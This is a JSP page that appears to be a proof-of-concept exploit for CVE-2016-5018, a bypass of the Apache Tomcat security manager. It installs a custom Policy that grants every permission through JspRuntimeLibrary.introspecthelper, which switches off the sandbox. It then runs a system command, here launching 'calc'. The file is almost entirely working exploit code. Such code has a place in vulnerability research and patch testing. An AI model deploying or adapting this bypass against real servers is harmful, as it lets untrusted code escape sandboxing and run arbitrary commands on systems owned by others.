<%@ page language="java" contentType="text/html; charset=utf-8"
    import="java.net.*,java.io.*,org.apache.jasper.JasperException,org.apache.jasper.runtime.JspRuntimeLibrary,java.security.Permission
	,java.security.Policy,java.security.ProtectionDomain,java.security.*"
    pageEncoding="utf-8"%>
<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
<title>CVE-2016-5018</title>
</head>
<body>
    <h1>CVE-2016-5018</h1>
	 <h1>tomcat default policy bypass</h1>
    <hr>
    <%!
	public static class MyPolicy extends Policy {
        public MyPolicy(){}
        public boolean implies(ProtectionDomain paramProtectionDomain, Permission paramPermission){
            return true;
        }
    }
    public class MyBean {
        public MyPolicy payload;
        public void setPayload(String test)throws IOException {
			java.security.Policy.setPolicy(new MyPolicy());
			System.out.println("SecurityManager: " + System.getSecurityManager());
        }
    }
   
	void jsmBypassypass() throws JasperException {
        try{
            JspRuntimeLibrary.introspecthelper(new MyBean(), "payload", "all.policy", null, null, true);
        }catch (Exception e){
            e.printStackTrace();
        }
    }
    %>
    <%
	jsmBypassypass();
	//System.setSecurityManager(null);
	Runtime.getRuntime().exec("calc");
    %>
</body>
</html>
